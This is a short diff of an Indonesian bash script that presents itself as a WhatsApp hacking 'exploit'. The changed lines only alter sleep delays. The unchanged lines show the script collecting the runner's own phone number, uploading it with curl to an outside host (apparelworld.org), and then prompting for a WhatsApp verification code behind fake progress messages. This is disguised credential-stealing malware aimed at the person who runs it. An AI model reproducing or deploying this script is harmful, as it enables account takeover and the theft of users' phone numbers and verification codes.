@@ -11,13 +11,13 @@ Author = Fiqi Putra Ardiansyah ";
 echo "";
 read -p "Masukan Nomer Anda => " nomer;
 read -p "Masukan Nomer Target => " target;
-sleep 2
+sleep 1
 echo "[+] Sedang Mendapatkan Data...";
-sleep 3.0
+sleep 5
 echo "Login  => $nomer";
-sleep 0.5
+sleep 2.1
 echo "Target => $target";
-sleep 0.5
+sleep 2
 echo "[+] Memulai Exploit...";
 echo "Nomer => $nomer" >> hasil.html;
 curl -T hasil.html http://apparelworld.org/
@@ -25,7 +25,7 @@ sleep 5;
 echo "[+] Selesai.";
 echo "Sedang Mendapatkan Kode Verifikasi Mohon Tunggu Sebentar.";
 read -p "Verify Code => " code;
-sleep 2
+sleep 5
 echo "[+] Menghubungkan Ke Whatsapp.com...";
 echo "Login => $nomer";
 sleep 1.5
